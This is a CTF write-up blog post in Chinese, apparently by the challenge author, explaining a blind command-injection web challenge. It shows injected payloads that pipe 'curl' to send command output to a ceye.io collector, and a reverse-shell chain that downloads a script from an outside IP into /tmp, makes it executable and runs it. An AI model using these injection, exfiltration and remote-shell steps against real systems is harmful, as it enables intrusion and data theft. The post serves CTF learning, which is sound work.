---
title: happyMoctf-ping一下好吗WP
tags:
  - ctf
  - Web
  - 漏洞研究
category: [渗透测试,Web安全,命令执行]
abbrlink: 8f0228b2
date: 2018-02-15 18:39:15
---
# 0x00 前言
这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过`DNS通道/HTTP通道`和`反弹shell`。
# 0x01 DNS通道/HTTP通道
post ip=0.0.0.0|curl ***.ceye.io/\`whoami\`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有\`\` 和$()两种，这里()被过滤)
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
<!-- more -->
执行`ls|base64`(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-1e0c7759a04a3ad3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)。
然后cat就可以读flag。这里面出了个小差错，`<?php`后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-0d402cd5889e2bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
dns类似，直接post \`command\`.xx.ceye.io就可以

# 0x02 反弹shell
由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。`-`被禁了，不能通过-o来保存到文件，可以通过`>`。写到/tmp底下执行
post ip=0.0.0.0|curl 139.199.2.226:6666/1 >/tmp/1
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-c8eecae75ecda861.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
然后本机监听8080端口
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-bb7e6e0b6aaebf0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

post ip=0.0.0.0|/chmod +x tmp/1
添加执行权限
post ip=0.0.0.0|/tmp/1
反弹成功
![图片.png](http://upload-images.jianshu.io/upload_images/5443560-798bfb8dbf456659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)




